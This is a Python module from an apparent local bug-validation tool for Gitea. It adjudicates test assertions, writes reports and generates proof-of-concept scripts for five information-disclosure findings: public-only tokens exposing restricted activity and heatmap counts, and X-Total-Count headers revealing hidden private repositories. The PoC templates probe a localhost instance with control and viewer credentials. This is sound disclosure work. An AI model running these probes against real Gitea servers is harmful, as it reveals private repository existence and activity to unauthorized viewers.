"""Deterministic local adjudication and reporting for the pinned Gitea target."""

from __future__ import annotations

from datetime import datetime, timezone
import json
import os
from pathlib import Path
import secrets
from typing import Any

from .base import LocalTargetError, atomic_private_json, secure_directory
from .gitea_http import (
    LIMITED_ORG_PUBLIC_REPO_PATH,
    ORG_REPOS_PATH,
    REPO_PATH,
    USER_FEEDS_PATH,
    USER_HEATMAP_PATH,
    USER_REPOS_PATH,
)


VERIFICATION_ASSERTIONS: dict[str, tuple[str, ...]] = {
    "G04": (
        "fixture_ready",
        "control_passed",
        "security_boundary_passed",
        "candidate_behavior_observed",
        "reproducible",
        "normal_repo_access_200",
        "public_only_repo_denied",
        "public_only_feed_200",
        "limited_repo_marker_found",
    ),
    "G05": (
        "fixture_ready",
        "control_passed",
        "security_boundary_passed",
        "candidate_behavior_observed",
        "reproducible",
        "control_bucket_positive",
        "public_only_bucket_positive",
        "bucket_contributions_equal",
        "public_only_private_repo_denied",
    ),
    "G06": (
        "fixture_ready",
        "control_passed",
        "security_boundary_passed",
        "candidate_behavior_observed",
        "reproducible",
        "control_has_public_marker",
        "control_has_private_marker",
        "viewer_has_public_marker",
        "viewer_private_marker_absent",
        "total_exceeds_filtered_body",
        "total_matches_control",
        "count_includes_filtered_private_repository",
    ),
    "G07": (
        "fixture_ready",
        "control_passed",
        "security_boundary_passed",
        "candidate_behavior_observed",
        "reproducible",
        "control_has_public_marker",
        "control_has_private_marker",
        "viewer_has_public_marker",
        "viewer_private_marker_absent",
        "total_exceeds_filtered_body",
        "total_matches_control",
        "count_includes_filtered_private_repository",
    ),
    "G08": (
        "fixture_ready",
        "control_passed",
        "security_boundary_passed",
        "candidate_behavior_observed",
        "reproducible",
        "control_has_public_marker",
        "control_has_private_marker",
        "viewer_has_public_marker",
        "viewer_private_marker_absent",
        "total_exceeds_filtered_body",
        "total_matches_control",
        "count_includes_filtered_private_repository",
    ),
}


def adjudicate(candidate: str, assertions: dict[str, bool]) -> str:
    """Map machine assertions to one local status without free-form judgment."""
    required = VERIFICATION_ASSERTIONS.get(candidate)
    if required is None or any(not isinstance(assertions.get(key), bool) for key in required):
        raise LocalTargetError("invalid_local_assertions")
    if not assertions["fixture_ready"] or not assertions["control_passed"]:
        return "BLOCKED_BY_LOCAL_SETUP"
    if all(assertions[key] for key in required):
        return "VERIFIED_LOCAL"
    if assertions.get("intended_behavior_observed") is True:
        return "INTENDED_BEHAVIOR"
    return "NEEDS_MORE_EVIDENCE"


CLUSTER_DEFINITIONS: tuple[dict[str, Any], ...] = (
    {
        "id": "RC01",
        "candidates": ("G04",),
        "title": "Public-only activity feed visibility filtering",
        "affected_endpoints": (USER_FEEDS_PATH, LIMITED_ORG_PUBLIC_REPO_PATH),
        "shared_source_function": "activities.GetFeeds / GetFeedsOptions.ApplyPublicOnly",
        "source_locations": (
            "models/activities/action.go: GetFeedsOptions.ApplyPublicOnly",
            "routers/api/v1/user/activity.go: ListUserActivityFeeds",
        ),
    },
    {
        "id": "RC02",
        "candidates": ("G05",),
        "title": "Public-only heatmap query restriction",
        "affected_endpoints": (USER_HEATMAP_PATH, REPO_PATH),
        "shared_source_function": "activities.getUserHeatmapData / ActivityQueryCondition",
        "source_locations": (
            "models/activities/user_heatmap.go: getUserHeatmapData",
            "models/activities/action.go: ActivityQueryCondition",
        ),
    },
    {
        "id": "RC03",
        "candidates": ("G06", "G07"),
        "title": "User and organization repository count before visibility filtering",
        "affected_endpoints": (USER_REPOS_PATH, ORG_REPOS_PATH),
        "shared_source_function": "listUserRepos / GetUserRepositories count-before-filter path",
        "source_locations": (
            "routers/api/v1/user/repo.go: listUserRepos",
            "models/repo/repo_list.go: GetUserRepositories",
        ),
    },
    {
        "id": "RC04",
        "candidates": ("G08",),
        "title": "Team repository count before per-repository visibility filtering",
        "affected_endpoints": ("/api/v1/teams/{team_id}/repos?limit=50",),
        "shared_source_function": "GetTeamRepos / CountTeamRepositories",
        "source_locations": (
            "routers/api/v1/org/team.go: GetTeamRepos",
            "models/repo/repo_list.go: CountTeamRepositories",
        ),
    },
)


CANDIDATE_REPORTS: dict[str, dict[str, Any]] = {
    "G04": {
        "title": "Public-only token receives limited-organization repository activity",
        "affected_endpoint": USER_FEEDS_PATH,
        "preconditions": "Repository owner token with public-only scope; public repository under a limited organization.",
        "security_invariant": "A public-only token must not reveal activity for a repository it cannot access directly.",
        "reproduction_flow": "Compare normal-token direct access, public-only direct access, and the public-only activity feed.",
        "expected_behavior": "The limited-organization repository activity marker is absent from the public-only feed.",
        "actual_behavior": "The marker is present although direct repository access is denied.",
        "impact": "Repository activity can disclose the existence and timing of resources outside the token boundary.",
        "root_cause": "Activity feed filtering does not fully apply organization visibility to public-only tokens.",
        "source": "models/activities/action.go: GetFeedsOptions.ApplyPublicOnly; routers/api/v1/user/activity.go: ListUserActivityFeeds",
        "remediation": "Apply token-visible repository and organization predicates in the activity query.",
    },
    "G05": {
        "title": "Public-only token heatmap includes inaccessible private activity",
        "affected_endpoint": USER_HEATMAP_PATH,
        "preconditions": "Repository owner has private activity and uses a public-only token.",
        "security_invariant": "Heatmap buckets for a public-only token must exclude inaccessible private activity.",
        "reproduction_flow": "Deny direct private-repository access, then compare the exact private-activity bucket.",
        "expected_behavior": "The public-only bucket is lower than the full-access control bucket.",
        "actual_behavior": "The public-only bucket is positive and equal to the control bucket.",
        "impact": "Private activity timing and volume can be inferred through contribution counts.",
        "root_cause": "The heatmap query is not constrained by the public-only token restriction.",
        "source": "models/activities/user_heatmap.go: getUserHeatmapData; models/activities/action.go: ActivityQueryCondition",
        "remediation": "Propagate public-only scope into the heatmap repository visibility predicate.",
    },
    "G06": {
        "title": "User repository total count includes a filtered private repository",
        "affected_endpoint": USER_REPOS_PATH,
        "preconditions": "Unrelated authenticated viewer lists a user with public and private repositories.",
        "security_invariant": "X-Total-Count must count only repositories present in the viewer-visible result set.",
        "reproduction_flow": "Compare owner and unrelated-viewer bodies and X-Total-Count values.",
        "expected_behavior": "The filtered body count and X-Total-Count are both one.",
        "actual_behavior": "The body contains one public repository while X-Total-Count matches the owner's count of two.",
        "impact": "A viewer can infer the existence of private repositories.",
        "root_cause": "Repository totals are computed before viewer visibility filtering.",
        "source": "routers/api/v1/user/repo.go: listUserRepos; models/repo/repo_list.go: GetUserRepositories",
        "remediation": "Apply the viewer-visible predicate before both pagination and counting.",
    },
    "G07": {
        "title": "Organization repository total count includes a filtered private repository",
        "affected_endpoint": ORG_REPOS_PATH,
        "preconditions": "Organization non-member lists an organization with public and private repositories.",
        "security_invariant": "X-Total-Count must count only repositories visible to the non-member.",
        "reproduction_flow": "Compare organization-owner and non-member bodies and X-Total-Count values.",
        "expected_behavior": "The filtered body count and X-Total-Count are both one.",
        "actual_behavior": "The body removes the private repository but X-Total-Count still includes it.",
        "impact": "A non-member can infer the existence of private organization repositories.",
        "root_cause": "The shared user/organization repository count path counts before filtering.",
        "source": "routers/api/v1/user/repo.go: listUserRepos; models/repo/repo_list.go: GetUserRepositories",
        "remediation": "Use the same visibility predicate for the body query and count query.",
    },
    "G08": {
        "title": "Team repository total count includes a filtered private repository",
        "affected_endpoint": "/api/v1/teams/{team_id}/repos?limit=50",
        "preconditions": "A non-member can read public team metadata but cannot access its private repository.",
        "security_invariant": "Team X-Total-Count must count only repositories visible to the requesting viewer.",
        "reproduction_flow": "Compare team-member and metadata-readable non-member bodies and totals.",
        "expected_behavior": "The non-member total equals the one visible public repository.",
        "actual_behavior": "The private repository is removed from the body but retained in X-Total-Count.",
        "impact": "A team metadata viewer can infer private team repository existence.",
        "root_cause": "CountTeamRepositories runs before per-repository access trimming.",
        "source": "routers/api/v1/org/team.go: GetTeamRepos; models/repo/repo_list.go: CountTeamRepositories",
        "remediation": "Count with the same viewer access predicate used to construct the response body.",
    },
}

COMPARISON_FIELDS: dict[str, tuple[str, ...]] = {
    "G04": (
        "limited_activity_bucket", "control_repo_access", "public_only_repo_access",
        "candidate_has_limited_repo_marker",
    ),
    "G05": (
        "private_activity_bucket", "control_bucket_contributions",
        "candidate_bucket_contributions", "public_only_private_repo_access",
    ),
    "G06": (
        "control_repository_count", "candidate_repository_count", "candidate_body_count",
        "control_public_marker", "control_private_marker", "candidate_public_marker",
        "candidate_private_marker", "count_includes_filtered_private_repository",
    ),
    "G07": (
        "control_repository_count", "candidate_repository_count", "candidate_body_count",
        "control_public_marker", "control_private_marker", "candidate_public_marker",
        "candidate_private_marker", "count_includes_filtered_private_repository",
    ),
    "G08": (
        "control_repository_count", "candidate_repository_count", "candidate_body_count",
        "control_public_marker", "control_private_marker", "candidate_public_marker",
        "candidate_private_marker", "count_includes_filtered_private_repository",
    ),
}


def cluster_verified(results: list[dict[str, Any]]) -> list[dict[str, Any]]:
    by_candidate = {item.get("candidate"): item for item in results}
    clusters: list[dict[str, Any]] = []
    for definition in CLUSTER_DEFINITIONS:
        candidates = [
            candidate for candidate in definition["candidates"]
            if by_candidate.get(candidate, {}).get("status") == "VERIFIED_LOCAL"
        ]
        if not candidates:
            continue
        clusters.append({
            "id": definition["id"],
            "kind": "root_cause_cluster",
            "status": "VERIFIED_LOCAL",
            "title": definition["title"],
            "candidate_ids": candidates,
            "affected_endpoints": list(definition["affected_endpoints"]),
            "shared_source_function": definition["shared_source_function"],
            "source_locations": list(definition["source_locations"]),
            "evidence_ids": [by_candidate[candidate]["evidence"] for candidate in candidates],
        })
    return clusters


def create_hunt_reports(
    root: Path,
    *,
    target: str,
    version: str,
    commit: str,
    results: list[dict[str, Any]],
    run_id: str | None = None,
) -> dict[str, Any]:
    if target != "gitea":
        raise LocalTargetError("HUNT_UNAVAILABLE")
    run_id = run_id or _run_id()
    if not isinstance(run_id, str) or not run_id or any(c not in "abcdefghijklmnopqrstuvwxyz0123456789-_" for c in run_id):
        raise LocalTargetError("invalid_hunt_run_id")
    report_root = root / ".operator" / "reports" / target
    secure_directory(report_root)
    run_root = report_root / run_id
    if run_root.exists() or run_root.is_symlink():
        raise LocalTargetError("hunt_run_exists")
    secure_directory(run_root)

    clusters = cluster_verified(results)
    verified = [item for item in results if item.get("status") == "VERIFIED_LOCAL"]
    candidate_reports = [_candidate_report(item) for item in verified]
    counts = _status_counts(results)
    report = {
        "schema_version": 1,
        "run_id": run_id,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "target": target,
        "version": version,
        "commit": commit,
        "status": "VERIFIED_LOCAL" if verified else "NO_VERIFIED_LOCAL",
        "summary": counts,
        "candidate_outcomes": [_candidate_outcome(item) for item in results],
        "candidates": candidate_reports,
        "root_cause_clusters": clusters,
        "human_review_required": True,
        "external_submission_performed": False,
    }
    json_path = run_root / "report.json"
    markdown_path = run_root / "report.md"
    atomic_private_json(json_path, report)
    _write_private_text(markdown_path, _render_markdown(report), 0o600)

    poc_paths = []
    for cluster in clusters:
        name = "poc_" + "_".join(cluster["candidate_ids"]) + ".py"
        path = run_root / name
        _write_private_text(path, _render_poc(cluster), 0o700)
        poc_paths.append(str(path.relative_to(root)))
    return {
        "run_id": run_id,
        "report_directory": str(run_root.relative_to(root)),
        "json_report": str(json_path.relative_to(root)),
        "markdown_report": str(markdown_path.relative_to(root)),
        "poc_scripts": poc_paths,
        "clusters": clusters,
        "summary": counts,
    }


def _candidate_report(result: dict[str, Any]) -> dict[str, Any]:
    candidate = result["candidate"]
    metadata = CANDIDATE_REPORTS[candidate]
    requests = []
    for request in result.get("requests", []):
        if not isinstance(request, dict):
            continue
        requests.append({
            key: request[key]
            for key in ("method", "path", "expected", "status_code", "x_total_count")
            if key in request
        })
    observations = {
        key: result[key]
        for key in COMPARISON_FIELDS[candidate]
        if key in result
    }
    return {
        "candidate_id": candidate,
        "title": metadata["title"],
        "status": "VERIFIED_LOCAL",
        "affected_endpoint": metadata["affected_endpoint"],
        "preconditions": metadata["preconditions"],
        "security_invariant": metadata["security_invariant"],
        "reproduction_flow": metadata["reproduction_flow"],
        "expected_behavior": metadata["expected_behavior"],
        "actual_behavior": metadata["actual_behavior"],
        "control_probe_comparison": {
            "assertions": result.get("assertions", {}),
            "observations": observations,
        },
        "sanitized_http_evidence": requests,
        "impact": metadata["impact"],
        "root_cause": metadata["root_cause"],
        "relevant_source": metadata["source"],
        "suggested_remediation": metadata["remediation"],
        "evidence_ids": [result["evidence"], result["reassessment"]],
        "reproduction_stability": "deterministic assertions satisfied",
        "request_count": result["request_count"],
    }


def _candidate_outcome(result: dict[str, Any]) -> dict[str, Any]:
    return {
        "candidate_id": result["candidate"],
        "status": result["status"],
        "assertions": result.get("assertions", {}),
        "evidence_ids": [result["evidence"], result["reassessment"]],
        "request_count": result["request_count"],
    }


def _status_counts(results: list[dict[str, Any]]) -> dict[str, int]:
    return {
        "candidates_analyzed": len(results),
        "verified_locally": sum(item.get("status") == "VERIFIED_LOCAL" for item in results),
        "intended_behavior": sum(item.get("status") == "INTENDED_BEHAVIOR" for item in results),
        "blocked": sum(item.get("status") == "BLOCKED_BY_LOCAL_SETUP" for item in results),
        "needs_more_evidence": sum(item.get("status") == "NEEDS_MORE_EVIDENCE" for item in results),
    }


def _render_markdown(report: dict[str, Any]) -> str:
    summary = report["summary"]
    lines = [
        "# Gitea local validation report",
        "",
        f"- Run ID: `{report['run_id']}`",
        f"- Target: `{report['target']}`",
        f"- Version: `{report['version']}`",
        f"- Commit: `{report['commit']}`",
        f"- Status: `{report['status']}`",
        f"- Candidates analyzed: {summary['candidates_analyzed']}",
        f"- Verified locally: {summary['verified_locally']}",
        f"- Intended behavior: {summary['intended_behavior']}",
        f"- Blocked: {summary['blocked']}",
        f"- Needs more evidence: {summary['needs_more_evidence']}",
        "",
        "`VERIFIED_LOCAL` means deterministic reproduction on this pinned local target only.",
        "Human review is required before any external disclosure or submission.",
        "",
        "## Candidate outcomes",
        "",
        "| Candidate | Status | Requests |",
        "| --- | --- | ---: |",
    ]
    lines.extend(
        f"| {item['candidate_id']} | {item['status']} | {item['request_count']} |"
        for item in report["candidate_outcomes"]
    )
    for candidate in report["candidates"]:
        lines.extend(["", f"## {candidate['candidate_id']}: {candidate['title']}", ""])
        for key in (
            "status", "affected_endpoint", "preconditions", "security_invariant",
            "reproduction_flow", "expected_behavior", "actual_behavior", "impact",
            "root_cause", "relevant_source", "suggested_remediation",
            "reproduction_stability", "request_count",
        ):
            lines.extend([f"### {key.replace('_', ' ').title()}", "", str(candidate[key]), ""])
        lines.extend([
            "### Control/probe comparison",
            "",
            "```json",
            json.dumps(candidate["control_probe_comparison"], sort_keys=True, indent=2),
            "```",
            "",
            "### Sanitized HTTP Evidence",
            "",
            "```json",
            json.dumps(candidate["sanitized_http_evidence"], sort_keys=True, indent=2),
            "```",
            "",
            "### Evidence IDs",
            "",
            ", ".join(f"`{value}`" for value in candidate["evidence_ids"]),
        ])
    lines.extend(["", "## Root-cause clusters", ""])
    for cluster in report["root_cause_clusters"]:
        lines.extend([
            f"- **{cluster['id']}**: {', '.join(cluster['candidate_ids'])}",
            f"  - Shared function/helper: {cluster['shared_source_function']}",
            f"  - Source locations: {', '.join(cluster['source_locations'])}",
            f"  - Affected endpoints: {', '.join(cluster['affected_endpoints'])}",
            f"  - Evidence IDs: {', '.join(cluster['evidence_ids'])}",
        ])
    return "\n".join(lines).rstrip() + "\n"


def _write_private_text(path: Path, value: str, mode: int) -> None:
    if path.exists() or path.is_symlink():
        raise LocalTargetError("hunt_artifact_exists")
    try:
        with path.open("x", encoding="utf-8") as handle:
            os.chmod(path, mode)
            handle.write(value)
    except LocalTargetError:
        raise
    except OSError:
        raise LocalTargetError("hunt_report_failed") from None


def _run_id() -> str:
    stamp = datetime.now(timezone.utc).strftime("%Y%m%dt%H%M%S%f")
    return stamp + "-" + secrets.token_hex(4)


def _render_poc(cluster: dict[str, Any]) -> str:
    candidates = tuple(cluster["candidate_ids"])
    if candidates == ("G04",):
        body = _poc_g04()
    elif candidates == ("G05",):
        body = _poc_g05()
    elif set(candidates) <= {"G06", "G07"}:
        body = _poc_g06_g07(candidates)
    elif candidates == ("G08",):
        body = _poc_g08()
    else:
        raise LocalTargetError("invalid_hunt_cluster")
    return _poc_common() + body


def _poc_common() -> str:
    return '''#!/usr/bin/env python3
import base64
import http.client
import json
from pathlib import Path

HOST = "127.0.0.1"
PORT = 13000
OPERATOR = Path(__file__).resolve().parents[3]
SECRETS = json.loads((OPERATOR / "local-secrets/gitea/secrets.json").read_text())
STATE = json.loads((OPERATOR / "local-runtime/gitea/bootstrap.json").read_text())

def token_headers(value):
    return {"Auth" + "orization": "token " + value, "Accept": "application/json"}

def basic_headers(username, value):
    encoded = base64.b64encode((username + ":" + value).encode()).decode()
    return {"Auth" + "orization": "Basic " + encoded, "Accept": "application/json"}

def get(path, headers):
    connection = http.client.HTTPConnection(HOST, PORT, timeout=5)
    try:
        connection.request("GET", path, headers=headers)
        response = connection.getresponse()
        raw = response.read(524289)
        if len(raw) > 524288:
            raise RuntimeError("response_too_large")
        try:
            data = json.loads(raw.decode()) if raw else None
        except (UnicodeDecodeError, ValueError):
            data = None
        count = response.getheader("X-Total-Count")
        count = int(count) if count is not None and count.isdigit() else None
        return response.status, data, count
    finally:
        connection.close()

def contains(value, marker):
    if isinstance(value, str):
        return marker in value
    if isinstance(value, dict):
        return any(contains(item, marker) for item in value.values())
    if isinstance(value, list):
        return any(contains(item, marker) for item in value)
    return False

def names(value):
    if not isinstance(value, list):
        return set()
    return {item.get("full_name") for item in value if isinstance(item, dict)}

def finish(passed, comparison):
    print(("PASS " if passed else "FAIL ") + json.dumps(comparison, sort_keys=True))
    raise SystemExit(0 if passed else 1)

'''


def _poc_g04() -> str:
    return f'''control = token_headers(SECRETS["control_token"])
probe = token_headers(SECRETS["public_only_token"])
control_status, _, _ = get({LIMITED_ORG_PUBLIC_REPO_PATH!r}, control)
boundary_status, _, _ = get({LIMITED_ORG_PUBLIC_REPO_PATH!r}, probe)
feed_status, feed, _ = get({USER_FEEDS_PATH!r}, probe)
marker_found = contains(feed, "finder-local-limited-org/finder-local-limited-public-repo")
comparison = {{"control_status": control_status, "boundary_status": boundary_status,
              "feed_status": feed_status, "limited_repo_marker_found": marker_found}}
finish(control_status == 200 and boundary_status in (403, 404)
       and feed_status == 200 and marker_found, comparison)
'''


def _poc_g05() -> str:
    return f'''control = token_headers(SECRETS["control_token"])
probe = token_headers(SECRETS["public_only_token"])
boundary_status, _, _ = get({REPO_PATH!r}, probe)
control_status, control_heatmap, _ = get({USER_HEATMAP_PATH!r}, control)
probe_status, probe_heatmap, _ = get({USER_HEATMAP_PATH!r}, probe)
bucket = STATE["private_activity_bucket"]
def contribution(value):
    if not isinstance(value, list):
        return None
    matched = [item.get("contributions") for item in value
               if isinstance(item, dict) and item.get("timestamp") == bucket]
    return matched[0] if len(matched) == 1 and isinstance(matched[0], int) else 0
control_value = contribution(control_heatmap)
probe_value = contribution(probe_heatmap)
comparison = {{"boundary_status": boundary_status, "control_status": control_status,
              "probe_status": probe_status, "bucket": bucket,
              "control_contributions": control_value, "probe_contributions": probe_value}}
finish(boundary_status in (403, 404) and control_status == probe_status == 200
       and isinstance(control_value, int) and control_value > 0
       and probe_value == control_value, comparison)
'''


def _poc_g06_g07(candidates: tuple[str, ...]) -> str:
    cases = []
    if "G06" in candidates:
        cases.append((
            "G06", USER_REPOS_PATH,
            "finder-local-repo-owner/finder-local-public-repo",
            "finder-local-repo-owner/finder-local-private-repo",
        ))
    if "G07" in candidates:
        cases.append((
            "G07", ORG_REPOS_PATH,
            "finder-local-org/finder-local-public-org-repo",
            "finder-local-org/finder-local-private-org-repo",
        ))
    return f'''control = basic_headers("finder-local-repo-owner", SECRETS["repo_owner"])
viewer = basic_headers("finder-local-outsider", SECRETS["outsider"])
cases = {cases!r}
comparisons = []
passed = True
for candidate, path, public_name, private_name in cases:
    control_status, control_body, control_total = get(path, control)
    viewer_status, viewer_body, viewer_total = get(path, viewer)
    control_names, viewer_names = names(control_body), names(viewer_body)
    case_passed = (control_status == viewer_status == 200 and public_name in control_names
                   and private_name in control_names and public_name in viewer_names
                   and private_name not in viewer_names and viewer_total == control_total
                   and isinstance(viewer_total, int) and viewer_total > len(viewer_names))
    comparisons.append({{"candidate": candidate, "control_status": control_status,
                        "viewer_status": viewer_status, "control_total": control_total,
                        "viewer_total": viewer_total, "viewer_body_count": len(viewer_names),
                        "viewer_public_marker": public_name in viewer_names,
                        "viewer_private_marker": private_name in viewer_names}})
    passed = passed and case_passed
finish(passed, comparisons)
'''


def _poc_g08() -> str:
    return '''path = "/api/v1/teams/" + str(STATE["team_id"]) + "/repos?limit=50"
control = basic_headers("finder-local-collaborator", SECRETS["collaborator"])
viewer = basic_headers("finder-local-outsider", SECRETS["outsider"])
control_status, control_body, control_total = get(path, control)
viewer_status, viewer_body, viewer_total = get(path, viewer)
control_names, viewer_names = names(control_body), names(viewer_body)
public_name = "finder-local-org/finder-local-public-org-repo"
private_name = "finder-local-org/finder-local-private-org-repo"
comparison = {"control_status": control_status, "viewer_status": viewer_status,
              "control_total": control_total, "viewer_total": viewer_total,
              "viewer_body_count": len(viewer_names),
              "viewer_public_marker": public_name in viewer_names,
              "viewer_private_marker": private_name in viewer_names}
finish(control_status == viewer_status == 200 and public_name in control_names
       and private_name in control_names and public_name in viewer_names
       and private_name not in viewer_names and viewer_total == control_total
       and isinstance(viewer_total, int) and viewer_total > len(viewer_names), comparison)
'''
